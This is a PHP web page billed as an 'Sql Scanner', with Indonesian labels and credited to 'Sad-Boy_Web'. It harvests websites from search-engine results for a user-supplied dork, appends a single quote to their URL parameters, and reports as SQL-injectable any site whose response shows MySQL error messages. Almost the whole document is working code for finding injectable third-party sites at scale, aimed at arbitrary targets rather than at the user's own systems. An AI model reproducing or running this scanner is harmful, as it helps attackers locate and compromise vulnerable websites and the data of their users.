<html>
<html>
<title>Sql Scanner</title>
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <meta content="" name="keywords">
  <meta name="description" content="Mencari Web Vuln Sql Secara Otomatis ">   
	<center><br><Br><br>

<HTML><FONT COLOR="aqua"><FONT SIZE=3>Copyright.2019.Sad-Boy_Web</FONT><center>
<HTML><FONT COLOR="aqua"><FONT SIZE=4>Sql Scanner</FONT><center>
<HTML><FONT COLOR="red"><FONT SIZE=4>Fungsi:Melakukan Scan Vulnreability Sql menggunakan Dork</FONT><center>
 
<?php

echo '<br><br><center><form method="post" action=""><b><font color="green">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:#00ff00;background-color:#000000" size="20"/><input class="inputzbut" type="submit" style="color:#00ff00;background-color:#000000" name="scan" value="Scan"></form></center>';

ob_start();
set_time_limit(0);

if (isset($_POST['scan'])) {

$browser = $_SERVER['HTTP_USER_AGENT'];

$first = "startgoogle.startpagina.nl/index.php?q=";
$sec = "&start=";
$reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';

for($id=0 ; $id<=30; $id++){
$page=$id*10;
$dork=urlencode($_POST['dork']);
$url = $first.$dork.$sec.$page;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
$result = curl_exec($curl);
curl_close($curl);

preg_match_all($reg,$result,$matches);
}
foreach($matches[1] as $site){

$url = preg_replace("/=/", "='", $site);
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
curl_setopt($curl,CURLOPT_TIMEOUT,'5');
$GET=curl_exec($curl); 
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) { 
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font color=#FF0000> &#60;-- SQLI Vuln 

Found..</font></b></center>';
ob_flush();flush(); 
}else{ 
echo '<center><font color="#FFFFFF"><b>'.$url.'</b></font><font color="#0FFF16"> &#60;-- Not Vuln</font></center>';
ob_flush();flush(); 
}
ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();


